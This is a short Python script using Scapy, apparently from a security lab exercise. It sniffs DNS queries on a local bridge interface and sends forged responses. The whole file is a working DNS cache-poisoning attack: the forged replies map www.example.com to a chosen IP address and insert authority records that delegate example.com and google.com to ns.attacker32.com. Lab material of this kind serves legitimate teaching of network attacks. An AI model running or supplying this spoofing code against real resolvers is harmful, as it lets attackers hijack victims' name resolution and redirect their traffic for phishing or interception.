#!/usr/bin/env python3
from scapy.all import *


def spoof_dns(pkt):
    if DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8'):
        # Swap the source and destination IP address
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

        # Swap the source and destination port number
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                       ttl=259200, rdata='4.5.6.3')

        # The Authority Section
        NSsec1 = DNSRR(rrname='example.com', type='NS',
                       ttl=259200, rdata='ns.attacker32.com')
        NSsec2 = DNSRR(rrname='google.com', type='NS',
                       ttl=259200, rdata='ns.attacker32.com')

        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                     qdcount=1, ancount=1, nscount=2,
                     an=Anssec, ns=NSsec1 / NSsec2)

        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt / UDPpkt / DNSpkt
        send(spoofpkt)


# Sniff UDP query packets and invoke spoof_dns().
myFilter = "udp and (src host 10.9.0.53 and dst port 53)"  # Set the filter
pkt = sniff(iface='br-bc58d3481185', filter=myFilter, prn=spoof_dns)
